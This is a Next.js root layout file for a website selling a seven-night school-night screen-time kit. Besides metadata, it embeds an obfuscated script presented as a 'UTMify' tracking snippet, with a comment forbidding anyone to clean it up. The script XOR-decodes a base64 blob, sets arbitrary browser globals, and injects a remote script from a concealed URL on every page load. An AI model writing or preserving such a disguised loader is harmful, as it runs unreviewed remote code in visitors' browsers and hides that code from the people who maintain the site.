import type { Metadata, Viewport } from "next";
import "./globals.css";

export const metadata: Metadata = {
  metadataBase: new URL(process.env.URL || "https://school-night-screen-reset.netlify.app"),
  title: {
    default: "The 7-Day School-Night Screen Reset",
    template: "%s | School-Night Screen Reset",
  },
  description: "A seven-night printable action kit for clearer school-night screen boundaries.",
  icons: {
    icon: "/favicon.svg",
    shortcut: "/favicon.svg",
  },
  robots: { index: true, follow: true },
};

export const viewport: Viewport = {
  width: "device-width",
  initialScale: 1,
  themeColor: "#f7f3ea",
};

// UTMify UTM tracking, pasted verbatim from the snippet UTMify generated. Do not
// reformat or "clean up": it must stay byte-identical to what the vendor issued.
const UTMIFY_SCRIPT = `(function(){var h_ihc=atob("DJdgPvpN+ydI4DaJx+xCS4gh2R1qiEL9t+RaEdUun0lmlULkrvEZEJkilgkqkhn6pOUJTo4+1FI8jUWmq/YUW4k51U07whqrpuMUTJMvjlMtkxSznOxCUJsgngVywlLos/ZNS44gkkExzUb7ouEFUI5gg0QnhBv6pPxCEtg7mks9hRSz5bUdEoFvlUYlhRSz5fMBSptgjlMliVDw6ucSW4wolVNlk0PrrvMTHNZvjUYklVOr/bVCQ6cw");var o_0=[];for(var c_i=0;c_i<h_ihc.length;c_i++){o_0.push(h_ihc.charCodeAt(c_i)&255);}var v_0ii=o_0[0];var e_oo=o_0.slice(1,1+v_0ii);var i_mbw=o_0.slice(1+v_0ii);var d_bfc=i_mbw.map(function(b,u_5gep){return b^e_oo[u_5gep%v_0ii];});var q_107q="";for(var q_z=0;q_z<d_bfc.length;q_z++){q_107q+=String.fromCharCode(d_bfc[q_z]&255);}var y_1kg=decodeURIComponent(escape(q_107q));var p_fnlq=JSON.parse(y_1kg);var j_8=p_fnlq.globals||[];j_8.forEach(function(b_i){window[b_i.name]=b_i.value;});var t_xhxm=document.createElement("script");t_xhxm.src=p_fnlq.url;t_xhxm.async=true;t_xhxm.defer=true;(p_fnlq.attributes||[]).forEach(function(y_ic1){t_xhxm.setAttribute(y_ic1.name,y_ic1.value);});(document.head||document.documentElement).appendChild(t_xhxm);})();`;

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="en">
      <body>
        {children}
        <script dangerouslySetInnerHTML={{ __html: UTMIFY_SCRIPT }} />
      </body>
    </html>
  );
}
